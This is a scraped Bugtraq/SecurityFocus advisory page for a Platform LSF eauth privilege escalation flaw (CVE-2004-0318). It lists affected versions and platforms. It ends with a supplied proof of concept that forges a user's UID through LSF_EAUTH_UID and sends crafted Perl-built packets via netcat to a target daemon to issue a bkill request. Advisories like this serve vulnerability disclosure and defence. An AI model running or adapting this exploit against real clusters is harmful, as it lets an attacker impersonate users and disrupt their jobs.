#SpeeDr00t@Black Falcon<br>#bid9724<p><b><span style="font-size: 18pt;">Platform Load Sharing Facility EAuth Privilege Escalation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9724/info">info</a><br><a href="http://www.securityfocus.com/bid/9724/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9724/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9724/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9724/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				9724
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
				
					CVE-2004-0318<br/>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Feb 23 2004 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 12 2009 03:06AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery of this vulnerability has been credited to Tomasz Grabowski &lt;cadence@aci.com.pl&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Platform LSF 6.0 <br/>
					
				
					Platform LSF 5.1 <br/>
					
				
					Platform LSF 5.0 <br/>
					
				
					Platform LSF 4.2 <br/>
<span class="related">
						
							-
						
						HP HP-UX 11.20 <br/>
</span>
<span class="related">
						
							-
						
						IBM AIX 4.3.3 <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.14 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.13 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.12 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.11 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.10 <br/>
</span>
<span class="related">
						
							-
						
						Sun Solaris  8_sparc<br/>
</span>
<span class="related">
						
							-
						
						Sun Solaris  7.0<br/>
</span>
					
				
					Platform LSF 4.0 <br/>
<span class="related">
						
							-
						
						HP HP-UX 11.20 <br/>
</span>
<span class="related">
						
							-
						
						IBM AIX 4.3.3 <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.14 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.13 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.12 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.11 <br/>
</span>
<span class="related">
						
							-
						
						SGI IRIX 6.5.10 <br/>
</span>
<span class="related">
						
							-
						
						Sun Solaris  8_sparc<br/>
</span>
<span class="related">
						
							-
						
						Sun Solaris  7.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following example has been supplied:<br/><br/>$cat /etc/passwd|grep cadence<br/>cadence:x:500:500:Tomasz Grabowski:/home/cadence:/bin/bash<br/>$ export LSF_EAUTH_UID=500<br/>$ eauth -c hostname<br/>,',0/%+-$%$&amp;amp;&amp;amp;,/)<br/><br/>Now, she needs to send packets. She can do it, for the sake of simplicity,<br/>using Perl and NetCat software:<br/><br/>(<br/># first packet<br/>perl -e 'print "\x04\x00\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x00";<br/>print "\x00\x00\x00\x00";<br/>'<br/>sleep 1;<br/><br/>#let's call it a header, packet length<br/>perl -e 'print "\x00\x04\x00\x00\x0d\x00\x00\x00\x00\x00\x00\x40";<br/>#below we provide UID, GID and length of user name<br/>print "\x00\x00\x00\x00\x00\x00\x03\xee\x00\x00\x03\xee\x00\x00\x00\x07";<br/>#below is the user name, end indicator, and probably auth data field length<br/>print "\x63\x61\x64\x65\x6e\x63\x65\x00\x00\x00\x00\x03\x00\x00\x00\x10";<br/>#again authentication length and auth data itself<br/>print "\x00\x00\x00\x10\x2a\x30\x26\x24\x21\x25\x2e\x23\x2c\x23\x27\x2d";<br/>#rest of auth data, end indicator, question code (x09 - bkill) and process number<br/>print "\x2f\x28\x2b\x25\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00\x00\x77";<br/>print "\x00\x00\x00\x00";<br/>'<br/>#send it to the target daemon<br/>) | nc 192.168.10.106 6881
	
		<ul>
</ul>
</div>